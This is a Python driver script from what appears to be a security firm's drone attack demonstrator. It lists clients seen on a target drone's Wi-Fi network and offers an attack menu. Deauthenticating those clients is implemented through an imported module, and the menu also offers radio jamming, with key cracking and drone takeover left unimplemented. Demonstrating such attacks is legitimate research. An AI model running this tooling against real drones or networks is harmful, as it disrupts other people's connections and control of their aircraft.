#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##############################################################################
# Owner     : Expleo Group
# Author    : Tarek AZAIZ
# Project   : Drones Attack Demonstrator
# Subject   : Attacks to perform in the target's network
# Version   : 0.1
# Created   : 2022/03/31
# Modified  : 2022/05/04
##############################################################################

import pandas
from src.wifi.wifi_csv_tools import get_clients_bssid
import src.wifi.wifi_deauth as de

from pwn import *

from src.wifi.wifi_nw_tools import *
from src.wifi.wifi_vendors import *
from src.wifi.wifi_csv_tools import *
""" has to be the last import because of a bug in 'click' external lib """
from src.views.view_tools import *



"""
def get_target_clients():
    # import and sort the CSV dumping input file
    df = pandas.read_csv(CSV_CLI_DUMP
        , usecols=['Station MAC',' First time seen',' Last time seen',' Power',' # packets',' BSSID',' Probed ESSIDs']
    )
    df.sort_values([" Power"], axis=0, ascending=[False], inplace=True)

    targets = []
    for idx, row in df.iterrows():

        bssid   = row['BSSID']
        oui     = bssid[0:8]
        vendor = get_vendor(oui)

        if (vendor != "") :
            targets.append([vendor, bssid])

    return target
"""

def get_clients_of_target():
    return get_clients_bssid(CSV_CLI_DUMP)

def main(ap_bssid, essid, chan):
    
    menus = []
    targets = get_clients_of_target()

    if len(targets) == 0:
        print ("No clients detected in the target's network")
    else:
        menus.append("Deauthenticate legitimate clients of the drone")
        print("The following clients have been detected in the target's network:\n")
        for target in targets:
            print("'"+target+"' on '"+essid+"' network (channel "+chan+", BSSID: "+ap_bssid+")")


    # complete the menus
    menus.append("Perform a radio jamming")
    menus.append("[To be implemented] Crack the drone's wifi network key")
    menus.append("[To be implemented] Take control of the drone")


    print("\nPlease choose the attack to perform:\n")

    choice = int(choose_menu(menus))


    # deauthenticate the legitime user
    
    # target attack
    if (choice==1):
        #new_page()
        for cli_bssid in targets:
            de.deauth_client(ap_bssid, cli_bssid, chan, essid)
    


# debug
